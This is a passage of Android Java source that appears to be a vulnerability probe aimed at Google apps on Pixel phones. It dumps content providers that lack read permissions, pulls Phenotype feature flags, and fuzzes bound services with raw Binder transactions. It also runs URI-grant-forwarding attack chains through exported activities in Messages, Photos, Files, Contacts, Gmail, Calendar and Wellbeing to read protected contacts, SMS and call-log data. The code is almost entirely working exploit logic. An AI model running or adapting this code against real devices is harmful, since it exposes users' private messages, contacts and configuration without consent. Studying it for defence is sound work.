        testProvider(cr, "content://cellbroadcasts/history", "Cell Broadcast History");

        // 13. Adaptive Charging
        log("\n--- Settings Adaptive Charging ---");
        testProvider(cr, "content://com.android.settings.adaptive.charging", "Adaptive Charging");
        tryCall(cr, "content://com.android.settings.adaptive.charging", "getState",
            "Adaptive Charging getState()");

        // 16. Google Settings Provider (NO readPermission in manifest!)
        log("\n--- Google Settings Provider (no readPermission!) ---");
        testProvider(cr, "content://com.google.settings/partner", "Google Settings /partner");
        try {
            Cursor c = cr.query(
                Uri.parse("content://com.google.settings/partner"),
                null, null, null, null);
            if (c != null) {
                log("  [ACCESS] Google Settings partner: " + c.getCount() + " rows");
                if (c.getCount() > 0) {
                    leaksFound++;
                    log("    Columns: " + String.join(", ", c.getColumnNames()));
                    while (c.moveToNext()) {
                        String name = c.getString(c.getColumnIndex("name"));
                        String value = c.getString(c.getColumnIndex("value"));
                        log("    " + name + " = " + value);
                    }
                }
                c.close();
            }
        } catch (SecurityException se) {
            log("  [BLOCKED] Google Settings partner: " + se.getMessage());
        } catch (Exception e) {
            log("  Google Settings partner: " + e.getClass().getSimpleName() + " - " + e.getMessage());
        }

        // Try the internal authority (should be blocked)
        testProvider(cr, "content://com.google.android.gmscore.providersettings.do.not.use/partner",
            "Google Settings (internal authority)");

        // 17. Try GMS Phenotype via call() for feature flags
        log("\n--- Phenotype Feature Flags via call() ---");
        try {
            Bundle extras = new Bundle();
            extras.putString("packageName", "com.google.android.gms");
            Bundle result = cr.call(
                Uri.parse("content://com.google.android.gms.phenotype"),
                "getFlags", "com.google.android.gms", extras);
            if (result != null && result.size() > 0) {
                leaksFound++;
                log("  [LEAK] Phenotype flags: " + result.size() + " keys");
                int shown = 0;
                for (String key : result.keySet()) {
                    if (shown++ < 10) {
                        Object val = result.get(key);
                        log("    " + key + " = " + (val != null ? val.toString().substring(0, Math.min(60, val.toString().length())) : "null"));
                    }
                }
            } else {
                log("  Phenotype call(): " + (result != null ? "empty" : "null"));
            }
        } catch (Exception e) {
            log("  Phenotype call(): " + e.getClass().getSimpleName());
        }

        // 18. Google Recorder audio files
        log("\n--- Google Recorder ---");
        testProvider(cr, "content://com.google.android.apps.recorder.fileprovider", "Recorder FileProvider");

        // 19. PixelSystemService
        log("\n--- PixelSystemService ---");
        tryCall(cr, "content://com.google.android.pixelsystemservice", "getState", "PixelSystem getState()");

        // 20. Google Photos - different content URIs
        log("\n--- Google Photos ---");
        testProvider(cr, "content://com.google.android.apps.photos.contentprovider", "Photos ContentProvider");
        testProvider(cr, "content://com.google.android.apps.photos.freeupspace", "Photos FreeUpSpace");
        testProvider(cr, "content://com.google.android.apps.photos.sharousel", "Photos Sharousel");

        log("\nPhase 10 leaks found: " + leaksFound + "\n");
    }

    private void tryCall(ContentResolver cr, String uri, String method, String label) {
        try {
            Bundle result = cr.call(Uri.parse(uri), method, null, null);
            if (result != null && result.size() > 0) {
                leaksFound++;
                log("  [LEAK] " + label + ": Bundle(" + result.size() + " keys)");
                for (String key : result.keySet()) {
                    Object val = result.get(key);
                    if (val instanceof byte[]) {
                        byte[] bytes = (byte[]) val;
                        log("    " + key + " = byte[" + bytes.length + "]");
                        // Hex dump
                        StringBuilder hex = new StringBuilder();
                        for (int i = 0; i < Math.min(bytes.length, 200); i++) {
                            hex.append(String.format("%02x ", bytes[i]));
                        }
                        log("      hex: " + hex.toString().trim());
                        // Try as UTF-8 string
                        try {
                            String asStr = new String(bytes, "UTF-8");
                            String clean = asStr.replaceAll("[^\\x20-\\x7E]", ".");
                            log("      str: " + clean.substring(0, Math.min(200, clean.length())));
                        } catch (Exception ex) {}
                    } else {
                        String vs = val != null ? val.toString() : "null";
                        if (vs.length() > 120) vs = vs.substring(0, 120) + "...";
                        log("    " + key + " = " + vs);
                    }
                }
            } else if (result != null) {
                log("  " + label + ": empty Bundle");
            } else {
                log("  " + label + ": null");
            }
        } catch (SecurityException se) {
            log("  [BLOCKED] " + label);
        } catch (Exception e) {
            log("  " + label + ": " + e.getClass().getSimpleName());
        }
    }

    private static final int RC_DITTO_CONTACTS = 1100;
    private static final int RC_DITTO_SMS = 1101;
    private static final int RC_PHOTOS_PICKER = 1102;
    private static final int RC_FILES_SAVE = 1103;
    private static final int RC_CALENDAR_LAUNCH = 1104;
    private static final int RC_WELLBEING_ACCESS = 1105;
    private static final int RC_CONTACTS_PICKER = 1106;
    private static final int RC_GMAIL_COMPOSE = 1107;

    private void phase11_uri_grant_forwarding() {
        log("\n=== PHASE 11: URI Grant Forwarding Tests ===");
        log("Pattern: startActivityForResult with URI + FLAG_GRANT_READ_URI_PERMISSION");
        log("If activity calls setResult(OK, getIntent()), we get the URI grant back\n");

        Uri contactsUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        Uri smsUri = Uri.parse("content://sms");

        // Test 1: DittoWebActivity with Messages' OWN internal provider
        // BugleContentProviderInternal has grantUriPermissions=true (non-exported)
        // DittoWebActivity IS exported and calls setResult(-1, getIntent()) on mode switch
        // Chain: attacker URI → DittoWebActivity → setResult(getIntent()) → attacker gets access
        Uri bugleInternalUri = Uri.parse(
            "content://com.google.android.apps.messaging.shared.datamodel.BugleContentProviderInternal/conversations");
        try {
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setClassName("com.google.android.apps.messaging",
                "com.google.android.apps.messaging.dittosatellite.impl.DittoWebActivity");
            i.setData(bugleInternalUri);
            i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
            startActivityForResult(i, RC_DITTO_CONTACTS);
            log("[LAUNCHED] DittoWebActivity with BugleContentProviderInternal URI");
            log("  -> Switch REMOTE<->STANDALONE to trigger setResult(-1, getIntent())");
        } catch (Exception e) {
            log("[BLOCKED] DittoWebActivity internal: " + e.getMessage());
        }

        // Test 2: DittoWebActivity with MmsFileProvider (grantUriPermissions=true, non-exported)
        Uri mmsFileUri = Uri.parse(
            "content://com.google.android.apps.messaging.shared.datamodel.provider.MmsFileProvider/");
        try {
            Intent i2 = new Intent(Intent.ACTION_VIEW);
            i2.setClassName("com.google.android.apps.messaging",
                "com.google.android.apps.messaging.dittosatellite.impl.DittoWebActivity");
            i2.setData(mmsFileUri);
            i2.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
            startActivityForResult(i2, RC_DITTO_SMS);
            log("[LAUNCHED] DittoWebActivity with MmsFileProvider URI");
        } catch (Exception e) {
            log("[BLOCKED] DittoWebActivity MMS: " + e.getMessage());
        }

        // Test 2b: DittoWebActivity with MediaScratchFileProvider (EXPORTED + grantUriPermissions=true)
        Uri scratchUri = Uri.parse(
            "content://com.google.android.apps.messaging.shared.datamodel.MediaScratchFileProvider/");
        try {
            Intent i2b = new Intent(Intent.ACTION_VIEW);
            i2b.setClassName("com.google.android.apps.messaging",
                "com.google.android.apps.messaging.dittosatellite.impl.DittoWebActivity");
            i2b.setData(scratchUri);
            i2b.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
            startActivityForResult(i2b, 1108);
            log("[LAUNCHED] DittoWebActivity with MediaScratchFileProvider URI");
        } catch (Exception e) {
            log("[BLOCKED] DittoWebActivity scratch: " + e.getMessage());
        }

        // Test 3: Google Photos ExternalPickerActivity
        try {
            Intent i3 = new Intent(Intent.ACTION_PICK);
            i3.setClassName("com.google.android.apps.photos",
                "com.google.android.apps.photos.picker.external.ExternalPickerActivity");
            i3.setData(contactsUri);
            i3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            startActivityForResult(i3, RC_PHOTOS_PICKER);
            log("[LAUNCHED] Photos ExternalPickerActivity with contacts URI");
        } catch (Exception e) {
            log("[BLOCKED] Photos picker: " + e.getMessage());
        }

        // Test 4: Google Files SaveToDownloads
        try {
            Intent i4 = new Intent(Intent.ACTION_SEND);
            i4.setClassName("com.google.android.apps.nbu.files",
                "com.google.android.apps.nbu.files.gateway.savetodownloads.SaveToDownloadsActivity");
            i4.setType("text/plain");
            i4.putExtra(Intent.EXTRA_STREAM, contactsUri);
            i4.setClipData(ClipData.newRawUri("contacts", contactsUri));
            i4.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            startActivityForResult(i4, RC_FILES_SAVE);
            log("[LAUNCHED] Files SaveToDownloads with contacts URI");
        } catch (Exception e) {
            log("[BLOCKED] Files SaveToDownloads: " + e.getMessage());
        }

        // Test 5: Google Contacts ContactPickerActivity
        try {
            Intent i5 = new Intent(Intent.ACTION_PICK);
            i5.setClassName("com.google.android.contacts",
                "com.google.android.apps.contacts.activities.leaf.ui.picker.ContactPickerActivity");
            i5.setType("vnd.android.cursor.dir/phone_v2");
            i5.setData(Uri.parse("content://call_log/calls"));
            i5.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            startActivityForResult(i5, RC_CONTACTS_PICKER);
            log("[LAUNCHED] Contacts Picker with call_log URI");
        } catch (Exception e) {
            log("[BLOCKED] Contacts picker: " + e.getMessage());
        }

        // Test 6: Wellbeing ExternalAccessRequestActivity
        try {
            Intent i6 = new Intent();
            i6.setClassName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.externalaccess.ExternalAccessRequestActivity");
            i6.setData(contactsUri);
            i6.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            startActivityForResult(i6, RC_WELLBEING_ACCESS);
            log("[LAUNCHED] Wellbeing ExternalAccessRequest with contacts URI");
        } catch (Exception e) {
            log("[BLOCKED] Wellbeing: " + e.getMessage());
        }

        // Test 7: Gmail ComposeActivityGmailExternal
        try {
            Intent i7 = new Intent(Intent.ACTION_SEND);
            i7.setClassName("com.google.android.gm",
                "com.google.android.gm.ComposeActivityGmailExternal");
            i7.setType("text/plain");
            i7.setClipData(ClipData.newRawUri("contacts", contactsUri));
            i7.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            startActivityForResult(i7, RC_GMAIL_COMPOSE);
            log("[LAUNCHED] Gmail ComposeExternal with contacts URI");
        } catch (Exception e) {
            log("[BLOCKED] Gmail compose: " + e.getMessage());
        }

        // Test 8: Google Calendar LaunchInfoActivity
        try {
            Intent i8 = new Intent(Intent.ACTION_VIEW);
            i8.setClassName("com.google.android.calendar",
                "com.google.android.calendar.LaunchInfoActivity");
            i8.setData(contactsUri);
            i8.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            startActivityForResult(i8, RC_CALENDAR_LAUNCH);
            log("[LAUNCHED] Calendar LaunchInfoActivity with contacts URI");
        } catch (Exception e) {
            log("[BLOCKED] Calendar: " + e.getMessage());
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        String testName = "Unknown";
        switch (requestCode) {
            case RC_DITTO_CONTACTS: testName = "DittoWebActivity-BugleInternal"; break;
            case RC_DITTO_SMS: testName = "DittoWebActivity-MmsFile"; break;
            case 1108: testName = "DittoWebActivity-MediaScratch"; break;
            case RC_PHOTOS_PICKER: testName = "Photos-Picker"; break;
            case RC_FILES_SAVE: testName = "Files-SaveToDownloads"; break;
            case RC_CALENDAR_LAUNCH: testName = "Calendar-LaunchInfo"; break;
            case RC_WELLBEING_ACCESS: testName = "Wellbeing-ExternalAccess"; break;
            case RC_CONTACTS_PICKER: testName = "Contacts-Picker"; break;
            case RC_GMAIL_COMPOSE: testName = "Gmail-Compose"; break;
        }

        log("\n=== ACTIVITY RESULT: " + testName + " ===");
        log("resultCode: " + resultCode + (resultCode == -1 ? " (RESULT_OK)" : " (CANCELLED/OTHER)"));

        if (data != null) {
            log("data URI: " + data.getData());
            log("flags: 0x" + Integer.toHexString(data.getFlags()));
            if (data.getClipData() != null) {
                log("clipData items: " + data.getClipData().getItemCount());
                for (int i = 0; i < data.getClipData().getItemCount(); i++) {
                    log("  clip[" + i + "] URI: " + data.getClipData().getItemAt(i).getUri());
                }
            }
            if (data.getExtras() != null) {
                log("extras keys: " + data.getExtras().keySet());
            }

            // Try to read the URI if we got RESULT_OK
            if (resultCode == -1) {
                Uri resultUri = data.getData();
                if (resultUri != null) {
                    log("\n*** ATTEMPTING TO READ GRANTED URI ***");
                    try {
                        Cursor c = getContentResolver().query(resultUri, null, null, null, null);
                        if (c != null) {
                            log("[CRITICAL] URI READABLE! Rows: " + c.getCount());
                            log("Columns: " + java.util.Arrays.toString(c.getColumnNames()));
                            if (c.moveToFirst()) {
                                for (int col = 0; col < Math.min(c.getColumnCount(), 5); col++) {
                                    try {
                                        log("  " + c.getColumnName(col) + " = " + c.getString(col));
                                    } catch (Exception e) {}
                                }
                            }
                            c.close();
                            leaksFound++;
                            log("\n*** URI GRANT FORWARDING CONFIRMED ***");
                            log("*** CONFIDENTIALITY IMPACT: attacker reads protected data ***");
                        }
                    } catch (SecurityException se) {
                        log("URI read blocked: " + se.getMessage());
                    } catch (Exception e) {
                        log("URI read error: " + e.getMessage());
                    }
                }

                // Also try clipData URIs
                if (data.getClipData() != null) {
                    for (int i = 0; i < data.getClipData().getItemCount(); i++) {
                        Uri clipUri = data.getClipData().getItemAt(i).getUri();
                        if (clipUri != null) {
                            log("\nAttempting clipData[" + i + "] URI: " + clipUri);
                            try {
                                Cursor c2 = getContentResolver().query(clipUri, null, null, null, null);
                                if (c2 != null) {
                                    log("[CRITICAL] ClipData URI READABLE! Rows: " + c2.getCount());
                                    if (c2.moveToFirst()) {
                                        for (int col = 0; col < Math.min(c2.getColumnCount(), 5); col++) {
                                            try {
                                                log("  " + c2.getColumnName(col) + " = " + c2.getString(col));
                                            } catch (Exception ex) {}
                                        }
                                    }
                                    c2.close();
                                    leaksFound++;
                                    log("*** CLIP URI GRANT FORWARDING CONFIRMED ***");
                                }
                            } catch (SecurityException se) {
                                log("Clip URI blocked: " + se.getMessage());
                            } catch (Exception e) {
                                log("Clip URI error: " + e.getMessage());
                            }
                        }
                    }
                }
            }
        } else {
            log("data: null (no intent returned)");
        }
        updateDisplay();
    }

    private void phase9_summary() {
        log("========================================");
        log("  FINDINGS SUMMARY");
        log("========================================\n");
        log("Permissions auto-granted: " + grantedPermissions + "/" + totalPermissions);
        log("Services bound: " + servicesBound + "/" + servicesAttempted);
        log("Data leaks found: " + leaksFound);
        log("\nConfirmed findings:");
        log("  1. GServices - 1404 config entries + 3 API keys (CONFIRMED)");
        log("  2. All normal perms auto-granted, no user prompt");
        log("  3. 4 services bound via normal perms");
        log("\nCheck logcat for full results of Phase 10 deep scan");
    }

    private void bindTarget(String pkg, String cls, String label) {
        servicesAttempted++;
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(pkg, cls));

        try {
            boolean bound = bindService(intent, new ServiceConnection() {
                @Override
                public void onServiceConnected(ComponentName name, IBinder service) {
                    servicesBound++;
                    log("  [BOUND] " + label);
                    log("    " + name.flattenToShortString());
                    log("    IBinder: " + service.getClass().getName());
                    probeInterface(service);
                    updateDisplay();
                }
                @Override
                public void onServiceDisconnected(ComponentName name) {}
            }, Context.BIND_AUTO_CREATE);
            log("  bindService(" + label + ") = " + bound);
        } catch (SecurityException se) {
            log("  [BLOCKED] " + label + ": SecurityException");
        } catch (Exception e) {
            log("  [ERROR] " + label + ": " + e.getMessage());
        }
    }

    private void probeInterface(IBinder service) {
        try {
            String desc = service.getInterfaceDescriptor();
            if (desc != null && !desc.isEmpty()) {
                log("    Interface: " + desc);
            }
        } catch (Exception e) {}

        for (int code = 1; code <= 10; code++) {
            try {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    String iface = service.getInterfaceDescriptor();
                    if (iface != null) data.writeInterfaceToken(iface);
                } catch (Exception ex) {}
                boolean r = service.transact(code, data, reply, 0);
                int replySize = reply.dataSize();
                if (replySize > 0) {
                    log("    transact(" + code + "): reply=" + replySize + "B");
                    byte[] raw = reply.marshall();
                    StringBuilder hex = new StringBuilder();
                    for (int i = 0; i < Math.min(raw.length, 80); i++) {
                        hex.append(String.format("%02x ", raw[i]));
                    }
                    log("      raw: " + hex.toString().trim());
                    reply.setDataPosition(0);
                    try {
                        int status = reply.readInt();
                        log("      status=" + status);
                        if (status == 0) {
                            int pos = reply.dataPosition();
                            try {
                                String s = reply.readString();
                                if (s != null && s.length() > 0) {
                                    log("      str: " + s.substring(0, Math.min(80, s.length())));
                                }
                            } catch (Exception ex) {
                                reply.setDataPosition(pos);
                                try {
                                    int v = reply.readInt();
                                    log("      int: " + v);
                                } catch (Exception ex2) {}
                            }
                        }
                    } catch (Exception ex) {}
                } else {
                    log("    transact(" + code + "): reply=0B");
                }
                data.recycle();
                reply.recycle();
            } catch (SecurityException se) {
                log("    transact(" + code + "): SecurityException");
            } catch (Exception e) {
                if (code <= 3) log("    transact(" + code + "): " + e.getClass().getSimpleName());
                break;
            }
        }
    }

    private void testProvider(ContentResolver cr, String uri, String label) {
        try {
            Cursor c = cr.query(Uri.parse(uri), null, null, null, null);
            if (c != null) {
                log("  [ACCESS] " + label + ": " + c.getCount() + " rows");
                if (c.getCount() > 0) {
                    log("    Columns: " + String.join(", ", c.getColumnNames()));
                }
                c.close();
            } else {
                log("  [ACCESS] " + label + ": accessible (empty)");
            }
        } catch (SecurityException se) {
            log("  [BLOCKED] " + label);
        } catch (Exception e) {
            log("  [ACCESS] " + label + ": " + e.getClass().getSimpleName() +
                " (" + e.getMessage() + ")");
        }
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        sb.append(msg).append("\n");
        if (tv != null) {
            tv.setText(sb.toString());
        }
    }

    private void updateDisplay() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                tv.setText(sb.toString());
            }
        });
    }
}
